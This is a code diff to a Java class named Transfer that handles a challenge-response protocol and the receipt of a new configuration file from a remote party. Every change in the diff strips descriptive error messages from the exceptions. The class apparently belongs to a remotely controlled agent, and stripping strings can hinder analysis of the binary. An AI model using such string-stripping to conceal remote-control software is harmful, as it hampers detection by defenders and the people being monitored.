@@ -298,7 +298,7 @@ public class Transfer {
 			//#ifdef DEBUG
 			debug.error("receiving command: " + e);
 			//#endif
-			throw new ProtocolException("fillPayload");
+			throw new ProtocolException();
 		}
 
 	}
@@ -332,7 +332,7 @@ public class Transfer {
 			//#ifdef DEBUG
 			debug.error("receiving command: " + e);
 			//#endif
-			throw new ProtocolException("fillPayload");
+			throw new ProtocolException();
 		}
 	}
 
@@ -353,7 +353,7 @@ public class Transfer {
 		final Command command = recvCommand();
 
 		if (command == null || command.id != Proto.CHALLENGE) {
-			throw new ProtocolException("=wrong proto.challange");
+			throw new ProtocolException();
 		}
 
 		// e' arrivato il challange, leggo il contenuto
@@ -364,13 +364,13 @@ public class Transfer {
 				//#ifdef DEBUG
 				debug.error("getChallenge: expecting 16 bytes");
 				//#endif
-				throw new ProtocolException("getChallenge: expecting 16 bytes");
+				throw new ProtocolException();
 			}
 			// ho 16 byte di challange, li cifro e li salvo
 			challenge = crypto.encryptData(command.payload);
 
 		} else {
-			throw new ProtocolException("not a valid challenge command");
+			throw new ProtocolException();
 		}
 	}
 
@@ -404,12 +404,12 @@ public class Transfer {
 			file.create();
 			final boolean ret = file.write(command.payload);
 			if (!ret) {
-				throw new CommandException("Cannot write new conf");
+				throw new CommandException("write");
 			} else {
 				sendCommand(Proto.OK);
 			}
 		} else {
-			throw new CommandException("Empty conf");
+			throw new CommandException("conf");
 		}
 	}
 
@@ -428,20 +428,19 @@ public class Transfer {
 		final Command command = recvCommand();
 		// boolean exception = false;
 		if (command == null || command.id != Proto.RESPONSE) {
-			throw new ProtocolException("=wrong proto.response");
+			throw new ProtocolException();
 		}
 
 		// e' arrivato il response, leggo il contenuto
 		if (command.id == Proto.RESPONSE) {
 			fillPayloadLen(command, 16);
 			if (command.size() != 16) {
-				throw new ProtocolException("getResponse: expecting 16 bytes");
+				throw new ProtocolException();
 			}
 			// ho 16 byte di response, lo confronto con il challange crittato
 			final byte[] cryptoChallenge = crypto.encryptData(challenge);
 			if (!Arrays.equals(cryptoChallenge, command.payload)) {
-				throw new ProtocolException(
-						"getResponse: challange does not match");
+				throw new ProtocolException();
 			} else {
 				//#ifdef DEBUG_INFO
 				debug.info("Response OK");
@@ -450,7 +449,7 @@ public class Transfer {
 			}
 
 		} else {
-			throw new ProtocolException("not a valid response command");
+			throw new ProtocolException();
 		}
 
 	}
@@ -780,7 +779,7 @@ public class Transfer {
 		}
 
 		if (!sendCommand(Proto.CHALLENGE, challenge)) {
-			throw new ProtocolException("sendChallenge: cannot send");
+			throw new ProtocolException();
 		}
 	}
 
@@ -998,8 +997,7 @@ public class Transfer {
 		}
 
 		if (!sent) {
-			throw new ProtocolException("sendManagedCommand cannot send"
-					+ commandId);
+			throw new ProtocolException();
 		}
 
 		return waitForOKorNO();
@@ -1024,7 +1022,7 @@ public class Transfer {
 
 		// challange contiene il challange cifrato, pronto per spedizione
 		if (!sendCommand(Proto.RESPONSE, challenge)) {
-			throw new ProtocolException("sendResponse: cannot send response");
+			throw new ProtocolException();
 		}
 
 		waitForOK();
@@ -1141,14 +1139,14 @@ public class Transfer {
 	private void waitForOK() throws ProtocolException {
 		final Command ok = recvCommand();
 		if (ok == null || ok.id != Proto.OK) {
-			throw new ProtocolException("waitForOK error");
+			throw new ProtocolException();
 		}
 	}
 
 	private boolean waitForOKorNO() throws ProtocolException {
 		final Command ok = recvCommand();
 		if (ok == null) {
-			throw new ProtocolException("waitForOKorNO error receiving");
+			throw new ProtocolException();
 		}
 
 		switch (ok.id) {
@@ -1160,10 +1158,10 @@ public class Transfer {
 			return false;
 
 		case Proto.BYE:
-			throw new ProtocolException("BYE", true);
+			throw new ProtocolException( true);
 
 		default:
-			throw new ProtocolException("waitForOKorNO error");
+			throw new ProtocolException();
 		}
 
 	}
